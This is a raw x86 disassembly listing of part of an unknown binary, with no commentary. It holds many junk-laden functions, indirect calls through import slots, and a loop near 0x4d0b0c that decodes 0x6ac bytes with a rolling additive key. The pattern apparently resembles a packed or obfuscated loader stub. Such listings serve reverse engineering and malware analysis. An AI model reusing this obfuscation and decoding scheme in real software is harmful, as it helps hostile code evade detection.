  4d07af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07b5:	sub    esp,0x40
  4d07b8:	lea    eax,ds:0x4d3070
  4d07be:	or     DWORD PTR [ebp-0x24],esi
  4d07c1:	push   eax
  4d07c2:	push   esi
  4d07c3:	push   DWORD PTR [eax+0x18c]
  4d07c9:	push   edi
  4d07ca:	push   esi
  4d07cb:	call   0x4d11d4
  4d07d0:	add    esp,0x10
  4d07d3:	pop    eax
  4d07d4:	push   eax
  4d07d5:	mov    edi,0x0
  4d07da:	push   edi
  4d07db:	call   0x4d0968
  4d07e0:	add    esp,0x4
  4d07e3:	pop    eax
  4d07e4:	push   eax
  4d07e5:	mov    edx,0x0
  4d07ea:	push   edx
  4d07eb:	call   0x4d12c8
  4d07f0:	add    esp,0x4
  4d07f3:	pop    eax
  4d07f4:	add    esp,0x40
  4d07f7:	pop    ebp
  4d07f8:	ret    
  4d07f9:	add    BYTE PTR [eax],al
  4d07fb:	add    BYTE PTR [edi-0x1],bl
  4d07fe:	adc    eax,0x4d2040
  4d0803:	call   edi
  4d0805:	add    BYTE PTR [eax],al
  4d0807:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d080d:	sub    esp,0x60
  4d0810:	mov    edx,0x4d31ac
  4d0815:	sub    edi,DWORD PTR [ebp-0x4c]
  4d0818:	push   edx
  4d0819:	push   DWORD PTR [edx+0x20]
  4d081c:	push   DWORD PTR [edx+0x13c]
  4d0822:	push   esi
  4d0823:	push   DWORD PTR [edx+0x14c]
  4d0829:	call   0x4d141c
  4d082e:	add    esp,0x10
  4d0831:	pop    edx
  4d0832:	push   edx
  4d0833:	call   0x4d07fc
  4d0838:	add    esp,0x4
  4d083b:	pop    edx
  4d083c:	mov    ecx,0x4d2028
  4d0841:	mov    ecx,DWORD PTR [ecx]
  4d0843:	push   ecx
  4d0844:	push   DWORD PTR [edx-0x4]
  4d0847:	pop    ecx
  4d0848:	call   ecx
  4d084a:	add    esp,0x60
  4d084d:	pop    ebp
  4d084e:	ret    
  4d084f:	add    BYTE PTR [edi-0x1],bl
  4d0852:	adc    eax,0x4d2028
  4d0857:	call   edi
  4d0859:	add    BYTE PTR [eax],al
  4d085b:	add    BYTE PTR [edi-0x1],bl
  4d085e:	adc    eax,0x4d2098
  4d0863:	call   edi
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d086d:	sub    esp,0x5c
  4d0870:	lea    ebx,ds:0x4d31f0
  4d0876:	adc    edi,ecx
  4d0878:	push   ebx
  4d0879:	push   esi
  4d087a:	push   edi
  4d087b:	push   DWORD PTR [ebx+0xf8]
  4d0881:	call   0x4d09e0
  4d0886:	add    esp,0xc
  4d0889:	pop    ebx
  4d088a:	call   0x4d12d4
  4d088f:	add    esp,0x4
  4d0892:	mov    edi,0x0
  4d0897:	push   edi
  4d0898:	call   0x4d0968
  4d089d:	add    esp,0x4
  4d08a0:	add    esp,0x5c
  4d08a3:	pop    ebp
  4d08a4:	ret    
  4d08a5:	add    BYTE PTR [eax],al
  4d08a7:	add    BYTE PTR [edi-0x1],bl
  4d08aa:	adc    eax,0x4d202c
  4d08af:	call   edi
  4d08b1:	add    BYTE PTR [eax],al
  4d08b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08b9:	sub    esp,0x3c
  4d08bc:	mov    ecx,0x4d3060
  4d08c1:	add    esi,DWORD PTR [ebp-0x30]
  4d08c4:	push   ecx
  4d08c5:	push   edx
  4d08c6:	push   edi
  4d08c7:	call   0x4d1148
  4d08cc:	add    esp,0x8
  4d08cf:	pop    ecx
  4d08d0:	push   ecx
  4d08d1:	push   0x0
  4d08d3:	call   0x4d107c
  4d08d8:	add    esp,0x4
  4d08db:	pop    ecx
  4d08dc:	push   ecx
  4d08dd:	call   0x4d12d4
  4d08e2:	add    esp,0x4
  4d08e5:	pop    ecx
  4d08e6:	add    esp,0x3c
  4d08e9:	pop    ebp
  4d08ea:	ret    
  4d08eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08f1:	sub    esp,0x58
  4d08f4:	mov    eax,0x4d3158
  4d08f9:	cmp    eax,0x36a7
  4d08fe:	jbe    0x4d08ef
  4d0900:	push   eax
  4d0901:	push   esi
  4d0902:	push   ecx
  4d0903:	call   0x4d0b9c
  4d0908:	add    esp,0x8
  4d090b:	pop    eax
  4d090c:	push   eax
  4d090d:	mov    ebx,0xfffffff4
  4d0912:	push   ebx
  4d0913:	call   0x4d0974
  4d0918:	add    esp,0x4
  4d091b:	pop    eax
  4d091c:	push   eax
  4d091d:	lea    esi,[eax-0x158]
  4d0923:	push   esi
  4d0924:	call   0x4d0850
  4d0929:	add    esp,0x4
  4d092c:	test   eax,eax
  4d092e:	jne    0x4d091d
  4d0930:	pop    eax
  4d0931:	add    esp,0x58
  4d0934:	pop    ebp
  4d0935:	ret    
  4d0936:	add    BYTE PTR [eax],al
  4d0938:	pop    edi
  4d0939:	call   DWORD PTR ds:0x4d2004
  4d093f:	call   edi
  4d0941:	add    BYTE PTR [eax],al
  4d0943:	add    BYTE PTR [edi-0x1],bl
  4d0946:	adc    eax,0x4d2038
  4d094b:	call   edi
  4d094d:	add    BYTE PTR [eax],al
  4d094f:	add    BYTE PTR [edi-0x1],bl
  4d0952:	adc    eax,0x4d2064
  4d0957:	call   edi
  4d0959:	add    BYTE PTR [eax],al
  4d095b:	add    BYTE PTR [edi-0x1],bl
  4d095e:	adc    eax,0x4d2080
  4d0963:	call   edi
  4d0965:	add    BYTE PTR [eax],al
  4d0967:	add    BYTE PTR [edi-0x1],bl
  4d096a:	adc    eax,0x4d2018
  4d096f:	call   edi
  4d0971:	add    BYTE PTR [eax],al
  4d0973:	add    BYTE PTR [edi-0x1],bl
  4d0976:	adc    eax,0x4d2008
  4d097b:	call   edi
  4d097d:	add    BYTE PTR [eax],al
  4d097f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0985:	sub    esp,0x28
  4d0988:	lea    edx,[edi+0x1d0]
  4d098e:	xor    edi,DWORD PTR [edx-0x1b8]
  4d0994:	push   edx
  4d0995:	mov    eax,0x0
  4d099a:	push   eax
  4d099b:	call   0x4d10e0
  4d09a0:	add    esp,0x4
  4d09a3:	pop    edx
  4d09a4:	push   edx
  4d09a5:	push   ebx
  4d09a6:	push   DWORD PTR [edx+0x128]
  4d09ac:	push   ecx
  4d09ad:	push   ebx
  4d09ae:	call   0x4d0730
  4d09b3:	add    esp,0x10
  4d09b6:	pop    edx
  4d09b7:	push   edx
  4d09b8:	push   0x0
  4d09ba:	call   0x4d0a80
  4d09bf:	add    esp,0x4
  4d09c2:	pop    edx
  4d09c3:	add    esp,0x28
  4d09c6:	pop    ebp
  4d09c7:	ret    
  4d09c8:	pop    edi
  4d09c9:	call   DWORD PTR ds:0x4d2068
  4d09cf:	call   edi
  4d09d1:	add    BYTE PTR [eax],al
  4d09d3:	add    BYTE PTR [edi-0x1],bl
  4d09d6:	adc    eax,0x4d2020
  4d09db:	call   edi
  4d09dd:	add    BYTE PTR [eax],al
  4d09df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09e5:	sub    esp,0x44
  4d09e8:	lea    ecx,ds:0x4d3190
  4d09ee:	sbb    DWORD PTR [ebp-0x10],edx
  4d09f1:	push   ecx
  4d09f2:	push   DWORD PTR [ecx+0x1e8]
  4d09f8:	push   DWORD PTR [ecx+0x68]
  4d09fb:	push   ebx
  4d09fc:	push   DWORD PTR [ecx+0x1a4]
  4d0a02:	call   0x4d137c
  4d0a07:	add    esp,0x10
  4d0a0a:	pop    ecx
  4d0a0b:	push   ecx
  4d0a0c:	lea    edx,[ecx-0x190]
  4d0a12:	push   edx
  4d0a13:	call   0x4d0850
  4d0a18:	add    esp,0x4
  4d0a1b:	test   eax,eax
  4d0a1d:	jne    0x4d0a0c
  4d0a1f:	pop    ecx
  4d0a20:	push   ecx
  4d0a21:	lea    edi,[ecx-0x190]
  4d0a27:	push   edi
  4d0a28:	call   0x4d0850
  4d0a2d:	add    esp,0x4
  4d0a30:	test   eax,eax
  4d0a32:	jne    0x4d0a21
  4d0a34:	pop    ecx
  4d0a35:	add    esp,0x44
  4d0a38:	pop    ebp
  4d0a39:	ret    
  4d0a3a:	add    BYTE PTR [eax],al
  4d0a3c:	mov    edi,edi
  4d0a3e:	push   ebp
  4d0a3f:	mov    ebp,esp
  4d0a41:	sub    esp,0x38
  4d0a44:	lea    edi,ds:0x4d31f8
  4d0a4a:	sub    ebx,eax
  4d0a4c:	push   edi
  4d0a4d:	mov    edx,0x0
  4d0a52:	push   edx
  4d0a53:	call   0x4d0a80
  4d0a58:	add    esp,0x4
  4d0a5b:	pop    edi
  4d0a5c:	push   edi
  4d0a5d:	push   esi
  4d0a5e:	push   DWORD PTR [edi+0x134]
  4d0a64:	push   ebx
  4d0a65:	push   eax
  4d0a66:	call   0x4d0f1c
  4d0a6b:	add    esp,0x10
  4d0a6e:	pop    edi
  4d0a6f:	push   edi
  4d0a70:	push   0x0
  4d0a72:	call   0x4d12c8
  4d0a77:	add    esp,0x4
  4d0a7a:	pop    edi
  4d0a7b:	add    esp,0x38
  4d0a7e:	pop    ebp
  4d0a7f:	ret    
  4d0a80:	pop    edi
  4d0a81:	call   DWORD PTR ds:0x4d2014
  4d0a87:	call   edi
  4d0a89:	add    BYTE PTR [eax],al
  4d0a8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a91:	sub    esp,0x44
  4d0a94:	lea    edx,ds:0x4d3088
  4d0a9a:	xor    esi,DWORD PTR [ebp-0x1c]
  4d0a9d:	push   edx
  4d0a9e:	push   0x0
  4d0aa0:	call   0x4d107c
  4d0aa5:	add    esp,0x4
  4d0aa8:	pop    edx
  4d0aa9:	push   edx
  4d0aaa:	push   ebx
  4d0aab:	push   DWORD PTR [edx+0x1f8]
  4d0ab1:	call   0x4d10ec
  4d0ab6:	add    esp,0x8
  4d0ab9:	pop    edx
  4d0aba:	push   edx
  4d0abb:	mov    edx,0x0
  4d0ac0:	push   edx
  4d0ac1:	call   0x4d0968
  4d0ac6:	add    esp,0x4
  4d0ac9:	pop    edx
  4d0aca:	add    esp,0x44
  4d0acd:	pop    ebp
  4d0ace:	ret    
  4d0acf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ad5:	sub    esp,0x40
  4d0ad8:	mov    ecx,0x4d3050
  4d0add:	sub    edx,eax
  4d0adf:	push   ecx
  4d0ae0:	push   edx
  4d0ae1:	push   DWORD PTR [ecx+0x54]
  4d0ae4:	call   0x4d076c
  4d0ae9:	add    esp,0x8
  4d0aec:	pop    ecx
  4d0aed:	push   ecx
  4d0aee:	mov    eax,0x0
  4d0af3:	push   eax
  4d0af4:	call   0x4d10e0
  4d0af9:	add    esp,0x4
  4d0afc:	pop    ecx
  4d0afd:	push   ecx
  4d0afe:	call   0x4d12d4
  4d0b03:	add    esp,0x4
  4d0b06:	pop    ecx
  4d0b07:	add    esp,0x40
  4d0b0a:	pop    ebp
  4d0b0b:	ret    
  4d0b0c:	mov    edi,edi
  4d0b0e:	push   ebp
  4d0b0f:	mov    ebp,esp
  4d0b11:	sub    esp,0x30
  4d0b14:	cmp    eax,0x533c
  4d0b19:	jb     0x4d0b0f
  4d0b1b:	lea    esi,ds:0x4d30c4
  4d0b21:	mov    ebx,0x6ac
  4d0b26:	push   ebx
  4d0b27:	push   0x6ac
  4d0b2c:	push   0x40001
  4d0b31:	mov    eax,0x862985a6
  4d0b36:	push   DWORD PTR [eax+0x7a239a86]
  4d0b3c:	sub    DWORD PTR [esp],0x2
  4d0b40:	mov    eax,0x4d201c
  4d0b45:	pop    DWORD PTR [eax]
  4d0b47:	call   0x4d0d28
  4d0b4c:	add    esp,0x4
  4d0b4f:	push   eax
  4d0b50:	pop    DWORD PTR [esi+0xe4]
  4d0b56:	mov    ecx,DWORD PTR [esi+0xe4]
  4d0b5c:	lea    edi,[ecx]
  4d0b5e:	sub    ebx,ebx
  4d0b60:	dec    ebx
  4d0b61:	and    ebx,0x4d0014
  4d0b67:	mov    edx,0xd5d9a824
  4d0b6c:	xor    eax,eax
  4d0b6e:	xor    ecx,ecx
  4d0b70:	push   DWORD PTR [ebx+ecx*1]
  4d0b73:	add    DWORD PTR [esp],edx
  4d0b76:	pop    DWORD PTR [edi+ecx*2]
  4d0b79:	dec    DWORD PTR [edi]
  4d0b7b:	xor    edx,edx
  4d0b7d:	add    edx,DWORD PTR [ebx]
  4d0b7f:	add    ebx,0x4
  4d0b82:	add    edi,0x4
  4d0b85:	add    eax,0x4
  4d0b88:	cmp    eax,0x6ac
  4d0b8d:	jne    0x4d0b6e
  4d0b8f:	call   0x4d12d4
  4d0b94:	add    esp,0x4
  4d0b97:	add    esp,0x30
  4d0b9a:	pop    ebp
  4d0b9b:	ret    
  4d0b9c:	mov    edi,edi
  4d0b9e:	push   ebp
  4d0b9f:	mov    ebp,esp
  4d0ba1:	sub    esp,0x58
  4d0ba4:	lea    edx,[eax-0x140]
  4d0baa:	and    DWORD PTR [edx+0x108],0xffffc180
  4d0bb4:	push   edx
  4d0bb5:	push   DWORD PTR [edx+0x9c]
  4d0bbb:	push   eax
  4d0bbc:	push   DWORD PTR [edx+0x1e8]
  4d0bc2:	call   0x4d1488
  4d0bc7:	add    esp,0xc
  4d0bca:	pop    edx
  4d0bcb:	push   edx
  4d0bcc:	call   0x4d12d4
  4d0bd1:	add    esp,0x4
  4d0bd4:	pop    edx
  4d0bd5:	push   edx
  4d0bd6:	call   0x4d1130
  4d0bdb:	add    esp,0x4
  4d0bde:	pop    edx
  4d0bdf:	add    esp,0x58
  4d0be2:	pop    ebp
  4d0be3:	ret    
  4d0be4:	pop    edi
  4d0be5:	call   DWORD PTR ds:0x4d2090
  4d0beb:	call   edi
  4d0bed:	add    BYTE PTR [eax],al
  4d0bef:	add    BYTE PTR [edi+0x2b],dl
  4d0bf2:	call   DWORD PTR [edi+0x57]
  4d0bf5:	push   edi
  4d0bf6:	push   edi
  4d0bf7:	call   0x4d1130
  4d0bfc:	sub    esp,0xfffffffc
  4d0bff:	call   0x4d1464
  4d0c04:	push   0x2
  4d0c06:	xor    eax,eax
  4d0c08:	dec    eax
  4d0c09:	and    eax,0x4d3030
  4d0c0e:	push   0x0
  4d0c10:	lea    ecx,[eax+0x6]
  4d0c13:	add    BYTE PTR [ecx],0x41
  4d0c16:	push   eax
  4d0c17:	call   0x4d0d28
  4d0c1c:	pop    edi
  4d0c1d:	pop    edi
  4d0c1e:	pop    edi
  4d0c1f:	lea    edi,[eax+0x3b]
  4d0c22:	mov    edi,DWORD PTR [edi]
  4d0c24:	lea    eax,[eax+edi*1]
  4d0c27:	mov    eax,DWORD PTR [eax+0x28]
  4d0c2a:	pusha  
  4d0c2b:	mov    ah,0x45
  4d0c2d:	sub    al,ah
  4d0c2f:	ja     0x4d0808
  4d0c35:	popa   
  4d0c36:	ret    
  4d0c37:	add    BYTE PTR [edi-0x1],bl
  4d0c3a:	adc    eax,0x4d206c
  4d0c3f:	call   edi
  4d0c41:	add    BYTE PTR [eax],al
  4d0c43:	add    BYTE PTR [edi-0x1],bl
  4d0c46:	adc    eax,0x4d2034
  4d0c4b:	call   edi
  4d0c4d:	add    BYTE PTR [eax],al
  4d0c4f:	add    BYTE PTR [edi-0x1],bl
  4d0c52:	adc    eax,0x4d209c
  4d0c57:	call   edi
  4d0c59:	add    BYTE PTR [eax],al
  4d0c5b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c61:	sub    esp,0x24
  4d0c64:	lea    edx,ds:0x4d31a4
  4d0c6a:	add    DWORD PTR [edx-0xc],edi
  4d0c6d:	push   edx
  4d0c6e:	push   0xfffffff4
  4d0c70:	call   0x4d0974
  4d0c75:	add    esp,0x4
  4d0c78:	pop    edx
  4d0c79:	push   edx
  4d0c7a:	push   edi
  4d0c7b:	push   DWORD PTR [edx+0x170]
  4d0c81:	push   esi
  4d0c82:	push   DWORD PTR [edx+0x120]
  4d0c88:	call   0x4d155c
  4d0c8d:	add    esp,0x10
  4d0c90:	pop    edx
  4d0c91:	push   edx
  4d0c92:	call   0x4d1130
  4d0c97:	add    esp,0x4
  4d0c9a:	pop    edx
  4d0c9b:	add    esp,0x24
  4d0c9e:	pop    ebp
  4d0c9f:	ret    
  4d0ca0:	pop    edi
  4d0ca1:	call   DWORD PTR ds:0x4d2084
  4d0ca7:	call   edi
  4d0ca9:	add    BYTE PTR [eax],al
  4d0cab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cb1:	sub    esp,0x5c
  4d0cb4:	mov    edi,0x4d305c
  4d0cb9:	sub    DWORD PTR [ebp-0x48],0x74
  4d0cbd:	push   edi
  4d0cbe:	push   DWORD PTR [edi+0x130]
  4d0cc4:	push   esi
  4d0cc5:	push   DWORD PTR [edi+0x1dc]
  4d0ccb:	call   0x4d08ec
  4d0cd0:	add    esp,0xc
  4d0cd3:	pop    edi
  4d0cd4:	push   edi
  4d0cd5:	push   0x0
  4d0cd7:	call   0x4d127c
  4d0cdc:	add    esp,0x4
  4d0cdf:	pop    edi
  4d0ce0:	push   edi
  4d0ce1:	mov    ebx,0x0
  4d0ce6:	push   ebx
  4d0ce7:	call   0x4d0a80
  4d0cec:	add    esp,0x4
  4d0cef:	pop    edi
  4d0cf0:	add    esp,0x5c
  4d0cf3:	pop    ebp
  4d0cf4:	ret    
  4d0cf5:	add    BYTE PTR [eax],al
  4d0cf7:	add    BYTE PTR [edi-0x1],bl
  4d0cfa:	adc    eax,0x4d2088
  4d0cff:	call   edi
  4d0d01:	add    BYTE PTR [eax],al
  4d0d03:	add    BYTE PTR [edi-0x1],bl
  4d0d06:	adc    eax,0x4d2010
  4d0d0b:	call   edi
  4d0d0d:	add    BYTE PTR [eax],al
  4d0d0f:	add    BYTE PTR [edi-0x1],bl
  4d0d12:	adc    eax,0x4d204c
  4d0d17:	call   edi
  4d0d19:	add    BYTE PTR [eax],al
  4d0d1b:	add    BYTE PTR [edi-0x1],bl
  4d0d1e:	adc    eax,0x4d2074
  4d0d23:	call   edi
  4d0d25:	add    BYTE PTR [eax],al
  4d0d27:	add    BYTE PTR [edi-0x1],bl
  4d0d2a:	adc    eax,0x4d201c
  4d0d2f:	call   edi
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d39:	sub    esp,0x60
  4d0d3c:	mov    ecx,0x4d3120
  4d0d41:	xor    DWORD PTR [ebp-0x2c],eax
  4d0d44:	push   ecx
  4d0d45:	push   DWORD PTR [ecx+0x58]
  4d0d48:	push   edx
  4d0d49:	call   0x4d0e00
  4d0d4e:	add    esp,0x8
  4d0d51:	pop    ecx
  4d0d52:	push   ecx
  4d0d53:	call   0x4d12d4
  4d0d58:	add    esp,0x4
  4d0d5b:	pop    ecx
  4d0d5c:	push   ecx
  4d0d5d:	mov    ecx,0x0
  4d0d62:	push   ecx
  4d0d63:	call   0x4d147c
  4d0d68:	add    esp,0x4
  4d0d6b:	pop    ecx
  4d0d6c:	add    esp,0x60
  4d0d6f:	pop    ebp
  4d0d70:	ret    
  4d0d71:	add    BYTE PTR [eax],al
  4d0d73:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d79:	sub    esp,0x20
  4d0d7c:	lea    edi,[edx-0x168]
  4d0d82:	adc    ecx,DWORD PTR [edi+0x5c]
  4d0d85:	push   edi
  4d0d86:	call   0x4d07fc
  4d0d8b:	add    esp,0x4
  4d0d8e:	pop    edi
  4d0d8f:	push   edi
  4d0d90:	push   DWORD PTR [edi+0xa8]
  4d0d96:	push   DWORD PTR [edi+0x17c]
  4d0d9c:	push   edx
  4d0d9d:	push   esi
  4d0d9e:	call   0x4d0d34
  4d0da3:	add    esp,0x10
  4d0da6:	pop    edi
  4d0da7:	push   edi
  4d0da8:	mov    edx,0x0
  4d0dad:	push   edx
  4d0dae:	call   0x4d127c
  4d0db3:	add    esp,0x4
  4d0db6:	pop    edi
  4d0db7:	add    esp,0x20
  4d0dba:	pop    ebp
  4d0dbb:	ret    
  4d0dbc:	mov    edi,edi
  4d0dbe:	push   ebp
  4d0dbf:	mov    ebp,esp
  4d0dc1:	sub    esp,0x38
  4d0dc4:	mov    edx,0x4d31cc
  4d0dc9:	sbb    DWORD PTR [edx-0x128],0xb55
  4d0dd3:	push   edx
  4d0dd4:	push   esi
  4d0dd5:	push   edi
  4d0dd6:	call   0x4d07b0
  4d0ddb:	add    esp,0x8
  4d0dde:	pop    edx
  4d0ddf:	push   edx
  4d0de0:	mov    ecx,0x0
  4d0de5:	push   ecx
  4d0de6:	call   0x4d0938
  4d0deb:	add    esp,0x4
  4d0dee:	pop    edx
  4d0def:	push   edx
  4d0df0:	push   0xfffffff4
  4d0df2:	call   0x4d0974
  4d0df7:	add    esp,0x4
  4d0dfa:	pop    edx
  4d0dfb:	add    esp,0x38
  4d0dfe:	pop    ebp
  4d0dff:	ret    
  4d0e00:	mov    edi,edi
  4d0e02:	push   ebp
  4d0e03:	mov    ebp,esp
  4d0e05:	sub    esp,0x3c
  4d0e08:	mov    eax,0x4d304c
  4d0e0d:	mov    edi,ebx
  4d0e0f:	push   eax
  4d0e10:	push   0x0
  4d0e12:	call   0x4d127c
  4d0e17:	add    esp,0x4
  4d0e1a:	pop    eax
  4d0e1b:	push   eax
  4d0e1c:	push   DWORD PTR [eax+0xd8]
  4d0e22:	push   ecx
  4d0e23:	push   DWORD PTR [eax+0x1b0]
  4d0e29:	call   0x4d0b0c
  4d0e2e:	add    esp,0xc
  4d0e31:	pop    eax
  4d0e32:	push   eax
  4d0e33:	push   0x0
  4d0e35:	call   0x4d127c
  4d0e3a:	add    esp,0x4
  4d0e3d:	pop    eax
  4d0e3e:	add    esp,0x3c
  4d0e41:	pop    ebp
  4d0e42:	ret    
  4d0e43:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e49:	sub    esp,0x4c
  4d0e4c:	lea    edx,[edi-0x34]
  4d0e4f:	xor    edi,eax
  4d0e51:	push   edx
  4d0e52:	push   DWORD PTR [edx+0x164]
  4d0e58:	push   ecx
  4d0e59:	push   ecx
  4d0e5a:	push   DWORD PTR [edx+0x1f8]
  4d0e60:	call   0x4d1334
  4d0e65:	add    esp,0x10
  4d0e68:	pop    edx
  4d0e69:	push   edx
  4d0e6a:	mov    esi,0x0
  4d0e6f:	push   esi
  4d0e70:	call   0x4d107c
  4d0e75:	add    esp,0x4
  4d0e78:	pop    edx
  4d0e79:	push   edx
  4d0e7a:	push   0x0
  4d0e7c:	call   0x4d09d4
  4d0e81:	add    esp,0x4
  4d0e84:	pop    edx
  4d0e85:	add    esp,0x4c
  4d0e88:	pop    ebp
  4d0e89:	ret    
  4d0e8a:	add    BYTE PTR [eax],al
  4d0e8c:	mov    edi,edi
  4d0e8e:	push   ebp
  4d0e8f:	mov    ebp,esp
  4d0e91:	sub    esp,0x4c
  4d0e94:	lea    ebx,ds:0x4d305c
  4d0e9a:	add    DWORD PTR [ebx+0xc0],0x7d
  4d0ea1:	push   ebx
  4d0ea2:	push   DWORD PTR [ebx+0x64]
  4d0ea5:	push   DWORD PTR [ebx+0xb8]
  4d0eab:	push   ecx
  4d0eac:	call   0x4d1518
  4d0eb1:	add    esp,0xc
  4d0eb4:	pop    ebx
  4d0eb5:	mov    esi,0x0
  4d0eba:	push   esi
  4d0ebb:	call   0x4d0968
  4d0ec0:	add    esp,0x4
  4d0ec3:	mov    eax,0x0
  4d0ec8:	push   eax
  4d0ec9:	call   0x4d10e0
  4d0ece:	add    esp,0x4
  4d0ed1:	add    esp,0x4c
  4d0ed4:	pop    ebp
  4d0ed5:	ret    
  4d0ed6:	add    BYTE PTR [eax],al
  4d0ed8:	mov    edi,edi
  4d0eda:	push   ebp
  4d0edb:	mov    ebp,esp
  4d0edd:	sub    esp,0x40
  4d0ee0:	lea    eax,[ebx+0xf0]
  4d0ee6:	adc    edi,0x3a70
  4d0eec:	push   eax
  4d0eed:	push   0x0
  4d0eef:	call   0x4d127c
  4d0ef4:	add    esp,0x4
  4d0ef7:	pop    eax
  4d0ef8:	push   eax
  4d0ef9:	push   DWORD PTR [eax]
  4d0efb:	push   DWORD PTR [eax+0xf0]
  4d0f01:	call   0x4d0fa4
  4d0f06:	add    esp,0x8
  4d0f09:	pop    eax
  4d0f0a:	push   eax
  4d0f0b:	push   0x0
  4d0f0d:	call   0x4d0968
  4d0f12:	add    esp,0x4
  4d0f15:	pop    eax
  4d0f16:	add    esp,0x40
  4d0f19:	pop    ebp
  4d0f1a:	ret    
  4d0f1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f21:	sub    esp,0x34
  4d0f24:	lea    edx,[edi-0x30]
  4d0f27:	sub    ecx,0xffffdff5
  4d0f2d:	push   edx
  4d0f2e:	push   DWORD PTR [edx+0x18]
  4d0f31:	push   eax
  4d0f32:	call   0x4d08b4
  4d0f37:	add    esp,0x8
  4d0f3a:	pop    edx
  4d0f3b:	push   edx
  4d0f3c:	push   0x0
  4d0f3e:	call   0x4d0938
  4d0f43:	add    esp,0x4
  4d0f46:	pop    edx
  4d0f47:	push   edx
  4d0f48:	mov    ecx,0x0
  4d0f4d:	push   ecx
  4d0f4e:	call   0x4d09d4
  4d0f53:	add    esp,0x4
  4d0f56:	pop    edx
  4d0f57:	add    esp,0x34
  4d0f5a:	pop    ebp
  4d0f5b:	ret    
  4d0f5c:	mov    edi,edi
  4d0f5e:	push   ebp
  4d0f5f:	mov    ebp,esp
  4d0f61:	sub    esp,0x4c
  4d0f64:	mov    esi,0x4d30fc
  4d0f69:	sub    DWORD PTR [esi+0xf4],0x4ebd
  4d0f73:	push   0x0
  4d0f75:	call   0x4d0a80
  4d0f7a:	add    esp,0x4
  4d0f7d:	push   esi
  4d0f7e:	push   DWORD PTR [esi+0x58]
  4d0f81:	push   eax
  4d0f82:	push   edx
  4d0f83:	push   DWORD PTR [esi+0x15c]
  4d0f89:	call   0x4d0e8c
  4d0f8e:	add    esp,0x10
  4d0f91:	pop    esi
  4d0f92:	push   0x0
  4d0f94:	call   0x4d12c8
  4d0f99:	add    esp,0x4
  4d0f9c:	add    esp,0x4c
  4d0f9f:	pop    ebp
  4d0fa0:	ret    
  4d0fa1:	add    BYTE PTR [eax],al
  4d0fa3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa9:	sub    esp,0x58
  4d0fac:	mov    esi,0x4d313c
  4d0fb1:	cmp    esi,0x1c5
  4d0fb7:	je     0x4d0fa7
  4d0fb9:	call   0x4d12d4
  4d0fbe:	add    esp,0x4
  4d0fc1:	push   esi
  4d0fc2:	push   DWORD PTR [esi+0xc8]
  4d0fc8:	push   DWORD PTR [esi+0x168]
  4d0fce:	call   0x4d06ec
  4d0fd3:	add    esp,0x8
  4d0fd6:	pop    esi
  4d0fd7:	push   0x0
  4d0fd9:	call   0x4d14c4
  4d0fde:	add    esp,0x4
  4d0fe1:	add    esp,0x58
  4d0fe4:	pop    ebp
  4d0fe5:	ret    
  4d0fe6:	add    BYTE PTR [eax],al
  4d0fe8:	mov    edi,edi
  4d0fea:	push   ebp
  4d0feb:	mov    ebp,esp
  4d0fed:	sub    esp,0x54
  4d0ff0:	lea    ebx,[ecx+0x188]
  4d0ff6:	adc    edx,DWORD PTR [ebx-0x168]
  4d0ffc:	push   0x0
  4d0ffe:	call   0x4d12c8
  4d1003:	add    esp,0x4
  4d1006:	push   ebx
  4d1007:	push   DWORD PTR [ebx+0x144]
  4d100d:	push   DWORD PTR [ebx+0x1f8]
  4d1013:	push   esi
  4d1014:	call   0x4d0a8c
  4d1019:	add    esp,0xc
  4d101c:	pop    ebx
  4d101d:	mov    esi,0x0
  4d1022:	push   esi
  4d1023:	call   0x4d0968
  4d1028:	add    esp,0x4
  4d102b:	add    esp,0x54
  4d102e:	pop    ebp
  4d102f:	ret    
  4d1030:	mov    edi,edi
  4d1032:	push   ebp
  4d1033:	mov    ebp,esp
  4d1035:	sub    esp,0x48
  4d1038:	lea    edi,ds:0x4d317c
  4d103e:	sub    eax,DWORD PTR [ebp-0x18]
  4d1041:	push   edi
  4d1042:	push   ecx
  4d1043:	push   eax
  4d1044:	push   DWORD PTR [edi+0x15c]
  4d104a:	call   0x4d0dbc
  4d104f:	add    esp,0xc
  4d1052:	pop    edi
  4d1053:	push   edi
  4d1054:	lea    edx,[edi-0x17c]
  4d105a:	push   edx
  4d105b:	call   0x4d0850
  4d1060:	add    esp,0x4
  4d1063:	test   eax,eax
  4d1065:	jne    0x4d1054
  4d1067:	pop    edi
  4d1068:	push   edi
  4d1069:	push   0x0
  4d106b:	call   0x4d127c
  4d1070:	add    esp,0x4
  4d1073:	pop    edi
  4d1074:	add    esp,0x48
  4d1077:	pop    ebp
  4d1078:	ret    
  4d1079:	add    BYTE PTR [eax],al
  4d107b:	add    BYTE PTR [edi-0x1],bl
  4d107e:	adc    eax,0x4d200c
  4d1083:	call   edi
  4d1085:	add    BYTE PTR [eax],al
  4d1087:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d108d:	sub    esp,0x60
  4d1090:	lea    ecx,[esi-0x1d4]
  4d1096:	cmp    ecx,0x21d3
  4d109c:	je     0x4d108b
  4d109e:	push   ecx
  4d109f:	call   0x4d12d4
  4d10a4:	add    esp,0x4
  4d10a7:	pop    ecx
  4d10a8:	push   ecx
  4d10a9:	push   esi
  4d10aa:	push   edi
  4d10ab:	call   0x4d0fe8
  4d10b0:	add    esp,0x8
  4d10b3:	pop    ecx
  4d10b4:	push   ecx
  4d10b5:	push   0x0
  4d10b7:	call   0x4d14c4
  4d10bc:	add    esp,0x4
  4d10bf:	pop    ecx
  4d10c0:	add    esp,0x60
